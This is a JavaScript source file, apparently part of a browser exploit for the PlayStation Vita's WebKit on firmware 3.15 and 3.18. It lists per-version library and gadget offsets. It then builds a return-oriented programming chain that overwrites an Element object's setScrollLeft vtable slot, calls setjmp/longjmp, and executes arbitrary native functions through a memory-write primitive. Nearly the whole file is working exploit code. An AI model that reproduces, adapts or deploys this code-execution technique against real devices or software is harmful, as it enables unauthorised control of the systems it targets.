/*
    This file contains the ROP gadgets and such
*/

/*
    Defines
*/
SCE_NET_AF_INET = 2
SCE_NET_SOCK_STREAM = 1
SIZEOF_SIN = 16
SCE_NET_SO_RCVTIMEO = 0x1006
SCE_NET_SOL_SOCKET = 0xffff


/*
    Relevent offsets
*/
ver_offsets = {
    v3_15:{
            scewkbase_off : 0x3cc619,
            scelibcentry_off: 0x6b5700, 
            scelibnetentry_off: 0x6b56cc,
            scekernentry_off: 0x6b56dc,
            scekernbase_off: 0x82d9,
            scelibcbase_off: 0xf989,
            scelibnetbase_off: 0x22d1,
            elementvtable_off: -0x68,
            setscrollleft_off: 0x5b
        },
    v3_18:{ 
            scewkbase_off : 0x3cc619,
            scelibcentry_off: 0x6b56b0, 
            scelibnetentry_off: 0x6b567c,
            scekernentry_off: 0x6b568c,
            scekernbase_off: 0x82d9,
            scelibcbase_off: 0xf989,
            scelibnetbase_off: 0x22d1,
            elementvtable_off: -0x68,
            setscrollleft_off: 0x5b
         }
}


/*
    Initialize the function address and
    ROP gadget addresses
*/
function init_ggts(bases, caller, ver){
    var results = version_deps[ver];
    for (b in bases){
        if(bases.hasOwnProperty(b)){
            func_list = results[b].functions;
            for (fcn in func_list){
                if(func_list.hasOwnProperty(fcn)){
                    func_list[fcn] = caller(func_list[fcn] + bases[b], results);
                }
            }
            gadgets = results[b].gadgets;
            for (ggt in gadgets){
                if(gadgets.hasOwnProperty(ggt)){
                    gadgets[ggt]= gadgets[ggt] + bases[b];
                }
            } 
        }
    }
    return results;
}

/*
   Call a function
   Code execution is obtained by modifying the vptr of setScrollLeft() 
   from the Element object's vtable.
   We first save the Element object's structure then call setjmp() which will
   trash it. We then save the jmp context and restore the Element object's
   data structure.
   Finally we ROP to setup the arguments and then end the ROP chain with a call to
   longjmp() in order to return "cleanly" to javascript.
*/
function get_caller(tmpmem, element, vtidx, fkvtable){

    return function (fcn, libraries){

        return function(r0, r1, r2, r3){

            var allocate_tmp = init_memory(tmpmem);                      // temporary memory allocator
            var context_size = 0x30;
            var eleobj_size = 0x1e;

            var scontext = allocate_tmp(context_size * 4);               // copy of jmp context
            var seleobj = allocate_tmp(eleobj_size * 4);                 // copy of object
            var scewkggts = libraries.SceWebkit.gadgets;
            var scelibcggts = libraries.SceLibc.gadgets;

            // copy Element object
            for(var i = 0; i < eleobj_size; i++){
                aspace32[(seleobj + (i << 2)) / 4] = aspace32[(vtidx + (i << 2)) / 4];
            }

            // call setjmp
            aspace32[(fkvtable + (0x5b << 2)) / 4] = scelibcggts.scesetjmp;
            element.scrollLeft = 0xdeadbabe;                                 // r1

            // store jmp context
//            logdbg("Saving jmp context");
            for(var i = 0; i < context_size; i++){
                aspace32[(scontext + (i << 2)) / 4] = aspace32[(vtidx + (i << 2)) / 4];
            }

            // restore Element object
//            logdbg("Restoring Element object");
            for(var i = 0; i < 30; i++){
                aspace32[(vtidx + (i << 2)) / 4] = aspace32[(seleobj + (i << 2)) / 4];
            }

            var r0values = allocate_tmp(0x10 * 4);
            var r8values = allocate_tmp(0x10 * 4);
            var r4values = allocate_tmp(0x10 * 4);
            var r4values_0 = allocate_tmp(0x10 * 4);
            var r5values = allocate_tmp(0x10 * 4);
            var r1values_0 = allocate_tmp(0x10 * 4);
            var retval = allocate_tmp(0x4);

            mymemset(retval, 0, 4);

            aspace32[(r0values / 4)] = 0x0;                                 // r1
            aspace32[((r0values + 4) / 4)] = r3;                            // r3
            aspace32[((r0values + 8) / 4)] = 0x0;                           // r4
            aspace32[((r0values + 12) / 4)] = r8values;                     // r8
            aspace32[((r0values + 16) / 4)] = 0x0;                          // fp
            aspace32[((r0values + 20) / 4)] = 0x0;                          // ip
            aspace32[((r0values + 24) / 4)] = scewkggts.ldmr8;                        // pc

            aspace32[(r8values / 4)] = r0;                                  // r0
            aspace32[((r8values + 4) / 4)] = r1;                            // r1
            aspace32[((r8values + 8) / 4)] = r2;                            // r2
            aspace32[((r8values + 12) / 4)] = r4values_0;                   // r4
            aspace32[((r8values + 16) / 4)] = r5values;                     // r5
            aspace32[((r8values + 20) / 4)] = 0x0;                          // ip
            aspace32[((r8values + 24) / 4)] = scewkggts.ldmr5;              // lr
            aspace32[((r8values + 28) / 4)] = fcn;                          // pc (actual function)

            aspace32[(r5values / 4)] = r1values_0;                          // r1
            aspace32[((r5values + 4) / 4)] = 0x0;                           // r3
            aspace32[((r5values + 8) / 4)] = 0x0;                           // ip
            aspace32[((r5values + 12) / 4)] = scewkggts.ldmr4_0;            // lr
            aspace32[((r5values + 16) / 4)] = scewkggts.movr30;             // pc

            aspace32[(r4values_0 / 4)] = retval - 4;                        // r0
            aspace32[((r4values_0 + 4) / 4)] = 0x0;                         // ip
            aspace32[((r4values_0 + 8) / 4)] = scewkggts.ldmr1_0;           // lr
            aspace32[((r4values_0 + 12) / 4)] = scewkggts.str3;                       // pc

            aspace32[(r1values_0 / 4)] = 0x0;                               // r0
            aspace32[((r1values_0 + 4) / 4)] = 0x0;                         // r1
            aspace32[((r1values_0 + 8) / 4)] = 0x0;                         // r2
            aspace32[((r1values_0 + 12) / 4)] = r4values;                   // r4
            aspace32[((r1values_0 + 16) / 4)] = 0x0;                        // ip
            aspace32[((r1values_0 + 20) / 4)] = 0x0;                        // lr
            aspace32[((r1values_0 + 24) / 4)] = scewkggts.ldmr4;            // pc

            aspace32[(r4values / 4)] = scontext;                            // r0
            aspace32[((r4values + 4) / 4)] = 0x0;                           // r1
            aspace32[((r4values + 8) / 4)] = 0x0;                           // r2
            aspace32[((r4values + 12) / 4)] = 0x0;                          // ip
            aspace32[((r4values + 16) / 4)] = 0x0;                          // lr
            aspace32[((r4values + 20) / 4)] = scelibcggts.scelongjmp;       // pc

            var ropchain = [r0values, 0x41414141, 0x41414141, scewkggts.ldmr0];

            // copy ROP chain to some area
            var rchainaddr = allocate_tmp(ropchain.length * 4);             // address of ropchain
//            logdbg("ROPchain address: 0x" + rchainaddr.toString(16));


//            logdbg("Copying ropchain...");
            for(var i = 0; i < ropchain.length; i++){
                aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
            }

//            logdbg("Triggering");
            aspace32[(fkvtable + (0x5b << 2)) / 4] = scewkggts.ldmr1;       // begin
            element.scrollLeft = rchainaddr;                                // r1 will point to buffer we control

            return aspace32[(retval / 4)];
        }
    };
}
